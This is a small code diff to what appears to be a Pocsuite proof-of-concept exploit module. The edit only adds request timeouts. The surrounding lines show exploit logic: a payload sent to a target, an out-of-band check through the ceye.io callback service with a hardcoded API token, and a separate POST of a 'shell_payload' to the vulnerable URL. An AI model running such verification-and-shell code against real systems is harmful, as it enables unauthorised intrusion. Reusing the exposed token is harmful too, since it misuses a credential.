@@ -79,8 +79,8 @@ class DemoPOC(POCBase):
         }
 
         try:
-            requests.post(veri_url, data=payload, headers=headers)
-            resp = requests.get('http://api.ceye.io/v1/records?token=7404ec52d62f743915a2a3adc07a2077&type=request')
+            requests.post(veri_url, data=payload, headers=headers,timeout=15)
+            resp = requests.get('http://api.ceye.io/v1/records?token=7404ec52d62f743915a2a3adc07a2077&type=request',timeout=10)
             pattern = 'http://{0}(:{1})?/{2}'.format(check_host, check_port, random_uri)
             if re.search(pattern, resp.text):
                 result['VerifyInfo'] = {}
@@ -133,7 +133,7 @@ class DemoPOC(POCBase):
         }
 
         try:
-            requests.post(vul_url, data=shell_payload, headers=headers)
+            requests.post(vul_url, data=shell_payload, headers=headers,timeout=15)
         except Exception as e:
             logger.warn(str(e))
 
